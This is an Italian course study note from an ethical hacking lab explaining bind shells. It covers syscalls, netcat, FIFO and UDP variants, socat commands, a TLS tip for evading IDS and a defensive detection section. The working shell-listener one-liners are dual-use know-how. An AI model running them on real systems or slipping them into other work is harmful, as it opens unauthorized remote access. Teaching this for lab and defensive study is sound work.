## title: "Bind Shell" corso: Ethical Hacking Lab — Sapienza tipo: nota-concetto esame: 2026-06-05 tags: [eth, lab, bind-shell, remote-access, netcat, socat, socket] collegati: ["[[ETHL 0x02 - Remote Access]]", "[[Meterpreter]]"]

# Bind Shell

> [!abstract] In una riga La **bind shell** è una shell che **ascolta su una porta del target** e aspetta che l'attaccante si connetta. È il contrario della [[Reverse Shell]]: è il _target_ ad aprire la porta, l'_attaccante_ a connettersi.

---

## 1. Idea di base

```
Attaccante ──────────────→ Target
            si connette       |
                         nc -lp 4444
                         (ascolta)
```

Sul **target (victim box)**: viene avviato un processo che fa `bind()` su una porta, mette in ascolto la shell, e aspetta connessioni in ingresso.

Sul **attack box**: l'attaccante semplicemente si connette a quella porta e ottiene l'accesso interattivo alla shell.

> [!danger] Perché in the wild si usa poco Il problema fondamentale è il **firewall e il NAT**.
> 
> - La bind shell richiede che la porta sul target sia **raggiungibile dall'esterno** (connessione _in ingresso_ verso il target).
> - Nella realtà i firewall **bloccano quasi sempre le connessioni in ingresso** verso host interni.
> - Il NAT (es. router di casa/azienda) nasconde l'IP interno: l'attaccante non può aprire una connessione diretta verso un host NAT-tato senza port forwarding.
> 
> → **La [[Reverse Shell]] risolve entrambi i problemi** perché è il target che _esce_ verso l'attaccante (uscita quasi sempre permessa).
> 
> La bind shell resta utile in scenari specifici: target con IP pubblico diretto, rete interna già penetrata (pivoting), o quando l'attaccante non ha un IP pubblico stabile per ricevere una reverse.

---

## 2. Anatomia a livello di sistema (da saper spiegare)

Il sorgente C della slide 14 mostra le syscall coinvolte. Da capire concettualmente, non da memorizzare riga per riga:

|Passo|Syscall|Cosa fa|
|---|---|---|
|1|`socket()`|Crea il socket TCP|
|2|`bind()`|Associa il socket a indirizzo + porta (es. 0.0.0.0:4444)|
|3|`listen()`|Mette il socket in ascolto per connessioni in ingresso|
|4|`accept()`|Blocca finché arriva una connessione; restituisce un fd per comunicare|
|5|`dup2(fd, 0/1/2)`|**Ridirigo stdin, stdout, stderr sul socket**|
|6|`execve("/bin/sh")`|Eseguo la shell|

> [!warning] Il passaggio chiave: `dup2` Il motivo per cui la shell diventa "remota" è il `dup2`. Normalmente stdin/stdout/stderr di un processo puntano al terminale. Con `dup2(fd, 0)` li faccio puntare al **socket di rete**: adesso quando la shell legge input lo prende dalla rete, e quando scrive output lo manda in rete. L'attaccante vede tutto sul suo terminale come se fosse lì.
> 
> Senza questo passaggio la shell girerebbe sul target ma non comunicheresti con lei.

---

## 3. Bind shell con netcat

```bash
# Sul target (victim box) — apre la shell in ascolto
nc -e bash -lp 4444

# Sull'attaccante (attack box) — si connette
nc victim_box 4444
```

> [!note] `-e` rimosso dalla maggior parte delle distro Linux Per ragioni di sicurezza (`GAPING_SECURITY_HOLE`) l'opzione `-e` (collega un programma al socket) è stata eliminata. Il workaround usa una **named FIFO** per ricreare il canale bidirezionale:
> 
> ```bash
> # Bind con FIFO (victim box)
> mkfifo fifo; nc -lp 4444 < fifo | bash > fifo
> ```
> 
> **Perché funziona:** `nc` legge dalla FIFO e manda in rete; `bash` riceve i comandi da `nc` via pipe, li esegue, e manda l'output di nuovo nella FIFO (che torna a `nc`). La FIFO chiude il "loop" che `-e` avrebbe fatto automaticamente.

### Versione UDP

```bash
# Victim box
rm -f /tmp/f; mkfifo /tmp/f
nc -ulp 4444 < /tmp/f | bash > /tmp/f

# Attack box
nc -u victim_box 4444
```

> [!tip] `-s 127.0.0.1` in test locali Se stai testando su una rete non fidata, aggiungi `-s 127.0.0.1` al lato server per vincolare l'ascolto solo a localhost e non esporre la porta all'esterno.

---

## 4. Bind shell con socat

```bash
# Victim box (ascolta)
socat TCP-LISTEN:4444 EXEC:bash,stderr

# Attack box (si connette)
socat TCP:victim_box:4444 FILE:`tty`
```

`FILE:\`tty`` collega il terminale dell'attaccante al socket → l'esperienza è più comoda (dimensione terminale, colori) rispetto al nc grezzo.

> [!tip] Versione cifrata (TLS) socat supporta `OPENSSL-LISTEN:` per cifrare il canale → utile quando c'è un **IDS/IPS** che ispeziona il traffico. Il traffico in chiaro di nc verrebbe rilevato immediatamente da qualsiasi firma su `/bin/sh` o comandi comuni.

---

## 5. Bind shell vs Reverse shell — tabella comparativa

|                       | **Bind Shell**                                                     | **[[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells\|Reverse Shells]]** |
| --------------------- | ------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| Chi ascolta           | Il **target**                                                      | L'**attaccante**                                                                                                           |
| Chi si connette       | L'**attaccante**                                                   | Il **target**                                                                                                              |
| Direzione connessione | In **ingresso** verso il target                                    | In **uscita** dal target                                                                                                   |
| Problema firewall     | ❌ Spesso bloccata (in ingresso)                                    | ✅ Di solito passa (uscita permessa)                                                                                        |
| Problema NAT          | ❌ Non raggiungibile senza port forwarding                          | ✅ Il target "esce" autonomamente                                                                                           |
| Quando preferirla     | IP pubblico diretto, pivoting interno, attaccante senza IP stabile | Caso generale, target dietro firewall/NAT                                                                                  |

---

## 6. Bind shell come privilege escalation locale

> [!info] Uso non solo remoto Le slide ricordano che le shell servono anche per **l'escalation locale**. Es: sfrutti un buffer overflow su un binario **SUID root** → spawni una shell che gira con i privilegi root. In questo caso non c'è rete di mezzo: è una shell locale con privilegi elevati.
> 
> Collega a [[Ethl 0x01 vulnerabilities]] → SUID, symlink, world-writable.

---

## 7. Lato difensivo

> [!danger] Come rilevare e bloccare una bind shell
> 
> |Tecnica difensiva|Perché funziona|
> |---|---|
> |**Port scanning interno**|Rivela porte inattese in ascolto sul target|
> |**Firewall con egress + ingress filtering**|Blocca connessioni in ingresso verso porte non autorizzate|
> |**EDR / endpoint monitoring**|Rileva processi (`nc`, `bash`) con socket aperti in ascolto|
> |**Network monitoring**|Connessioni verso IP esterni non noti dal target|
> |**Disabilitare nc / socat**|Riduce la superficie — ma LotL/bash possono aggirare|

---

## 8. Domande di richiamo attivo

> [!question] A libro chiuso
> 
> 1. Cos'è una bind shell e come si differenzia da una reverse shell?
> 2. Perché le bind shell sono rare in the wild contro target dietro NAT o firewall?
> 3. Spiega il ruolo di `dup2` nell'apertura di una bind shell: cosa succederebbe senza?
> 4. Perché `-e` è stato rimosso da nc e come si aggira il limite con una FIFO?
> 5. In quale scenario specifico preferiresti una bind shell a una reverse?
> 6. Come rilevare che su un host è attiva una bind shell?

---

> [!success] Vedi anche [[ETHL 0x02 - Remote Access]] · [[Meterpreter]]